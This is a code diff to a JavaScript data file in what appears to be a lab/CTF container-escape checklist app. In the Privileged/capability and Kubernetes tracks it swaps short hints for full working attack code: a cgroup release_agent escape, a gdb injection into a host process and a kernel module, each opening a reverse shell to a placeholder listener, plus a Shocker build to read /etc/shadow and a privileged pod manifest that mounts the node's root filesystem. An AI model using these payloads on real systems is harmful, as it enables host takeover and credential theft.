@@ -816,14 +816,14 @@ const TRACKS=[
  {n:4,title:"Privileged / capability escapes",tag:"privesc",goal:"Turn --privileged or a dangerous capability into host code execution",steps:[
    {d:"Privileged: mount the host disk directly",c:"fdisk -l; mkdir -p /mnt/host; mount /dev/sda1 /mnt/host && chroot /mnt/host bash",
     l:"Pick the host root partition from <code>fdisk -l</code>. Then read /etc/shadow, drop an SSH key, or add a root cron."},
-   {d:"CAP_SYS_ADMIN (+ permissive AppArmor): cgroup release_agent",c:"# mount -t cgroup -o rdma cgroup /tmp/cg; point release_agent at a script on a host-visible path; empty a cgroup to trigger it",
-    l:"The classic notify_on_release / release_agent break-out \u2014 runs your payload as root on the host. HackTricks has the exact script."},
-   {d:"CAP_DAC_READ_SEARCH: Shocker reads host files by inode",c:"# open_by_handle_at brute force (shocker.c) to read /etc/shadow from the host with no mount",
-    l:"Reads arbitrary host files even without a mount; with DAC_OVERRIDE you can write them too."},
-   {d:"CAP_SYS_PTRACE + --pid=host: inject into a host process",c:"# attach a shellcode injector to a host PID (e.g. PID 1)",
-    l:"Shared host PID namespace plus ptrace is code execution in a host process's context."},
-   {d:"CAP_SYS_MODULE: load a kernel module",c:"# build a .ko whose init fires a reverse shell, then insmod it",
-    l:"Loading a module runs code in the kernel \u2014 total host compromise. Rare, but decisive."}
+   {d:"CAP_SYS_ADMIN (+ permissive AppArmor): cgroup release_agent",c:"# 1. a cgroup we can mount (needs CAP_SYS_ADMIN, AppArmor off/permissive)\nmkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null \\\n  || mount -t cgroup -o rdma cgroup /tmp/cgrp\nmkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release\n# 2. where this container's files live on the host (overlay upperdir)\nhost=$(sed -n 's/.*\\bupperdir=\\([^,]*\\).*/\\1/p' /etc/mtab | head -1)\necho \"$host/cmd\" > /tmp/cgrp/release_agent\n# 3. the payload that runs as ROOT on the host when the cgroup empties\nprintf '#!/bin/sh\\nbash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\\n' > /cmd && chmod +x /cmd\n# 4. trigger it (listener up first)\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"",
+    l:"The kernel runs <code>release_agent</code> as root on the host when the cgroup empties. The <code>upperdir</code> lookup makes <code>/cmd</code> resolve to a host-visible path. Start <code>nc -lvnp {LPORT}</code> first."},
+   {d:"CAP_DAC_READ_SEARCH: Shocker reads host files by inode",c:"# DAC_READ_SEARCH lets open_by_handle_at brute-force host inodes\ncurl -sO https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c\ngcc -static -o shocker shocker.c 2>/dev/null || gcc -o shocker shocker.c\n# the target host file is set near the top of shocker.c (default: /etc/shadow);\n# edit it, rebuild, then run to read that file straight off the host\n./shocker",
+    l:"Reads any host file with no mount. With CAP_DAC_OVERRIDE as well you can write them \u2014 drop a root SSH key or a cron. Needs a compiler in the container, or compile it elsewhere and copy the binary in."},
+   {d:"CAP_SYS_PTRACE + --pid=host: inject into a host process",c:"# shared host PID namespace + ptrace = code execution in a host process.\n# with gdb present, pick a host process and make it run your command:\nps -ef                      # choose a host PID you can attach to\ngdb -p <host_pid> -batch \\\n  -ex 'call (void)system(\"bash -c \\\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\\\"\")' \\\n  -ex detach -ex quit\n# no gdb? use a ptrace shellcode injector such as github.com/0x00pf/0x00sec_code",
+    l:"Only works when the container shares the host PID namespace (you saw host processes in <code>ps</code>). The injected command runs with that process's privileges \u2014 pick a root one. Listener up first."},
+   {d:"CAP_SYS_MODULE: load a kernel module",c:"# a kernel module whose init fires a reverse shell, loaded into the HOST kernel\ncat > rs.c <<'EOF'\n#include <linux/kmod.h>\n#include <linux/module.h>\nMODULE_LICENSE(\"GPL\");\nstatic char *a[] = {\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\",NULL};\nstatic char *e[] = {\"PATH=/sbin:/bin:/usr/sbin:/usr/bin\",NULL};\nstatic int __init x(void){ return call_usermodehelper(a[0],a,e,UMH_WAIT_EXEC); }\nstatic void __exit y(void){}\nmodule_init(x); module_exit(y);\nEOF\nmake -C /lib/modules/$(uname -r)/build M=$PWD obj-m=rs.o modules\ninsmod rs.ko     # listener up first; rmmod rs to clean up",
+    l:"<code>insmod</code> runs your code in the host kernel \u2014 total compromise. Needs the kernel headers for the running version (<code>/lib/modules/$(uname -r)/build</code>); build elsewhere and copy the .ko in if they are absent."}
  ],branch:["Root on the host \u2192 After the escape"],
   tips:["<b>--privileged or CAP_SYS_ADMIN is the usual lab/CTF path.</b> Check AppArmor and Seccomp first; the release_agent trick needs them off or permissive.","<b>CVE-2019-5736 (runc):</b> overwrite the host <code>runc</code> from inside the container, triggered the next time an admin <code>docker exec</code>s in."]},
  {n:5,title:"LXC / LXD group",tag:"privesc",goal:"Abuse lxd/lxc group membership (a classic lab escalation)",steps:[
@@ -835,8 +835,8 @@ const TRACKS=[
  {n:6,title:"Kubernetes",tag:"privesc",goal:"From a pod to the node, or the whole cluster",steps:[
    {d:"Grab the service-account token and see what it can do",c:"cat /run/secrets/kubernetes.io/serviceaccount/token; kubectl auth can-i --list",
     l:"The token authenticates you to the API. <code>can-i --list</code> shows your rights \u2014 create pods is usually enough."},
-   {d:"If you can create pods, schedule a privileged one that mounts the node",c:"# kubectl apply a pod with hostPID:true, privileged:true and hostPath source: / , then exec in and chroot /host",
-    l:"A pod binding the node's <code>/</code> gives root on that node. HackTricks has a ready manifest."},
+   {d:"If you can create pods, schedule a privileged one that mounts the node",c:"# a pod that mounts the node's / and runs privileged = root on that node\ncat > /tmp/priv.yaml <<'EOF'\napiVersion: v1\nkind: Pod\nmetadata: { name: r }\nspec:\n  hostPID: true\n  hostNetwork: true\n  containers:\n  - name: r\n    image: alpine          # use an image the node can already pull\n    command: [\"/bin/sh\",\"-c\",\"sleep 1d\"]\n    securityContext: { privileged: true }\n    volumeMounts:\n    - { name: host, mountPath: /host }\n  volumes:\n  - name: host\n    hostPath: { path: / }\nEOF\nkubectl apply -f /tmp/priv.yaml\nkubectl exec -it r -- chroot /host bash",
+    l:"Once inside, <code>/host</code> is the node's filesystem and the chroot is root on it. No <code>kubectl</code>? POST the same manifest to the API with the token as a <code>Bearer</code> header."},
    {d:"Hit the kubelet and the cloud metadata service",c:"curl -sk https://localhost:10250/pods; curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null",
     l:"A read/write kubelet API runs commands in pods. Cloud metadata can hand over node credentials."}
  ],tips:["<code>kubectl</code> is often absent \u2014 call the API with curl and the token as a <code>Bearer</code> header.","Once on the node, look for other pods' mounted secrets and tokens."]},
@@ -957,7 +957,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.2.0";
+const APP_VERSION="1.2.1";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
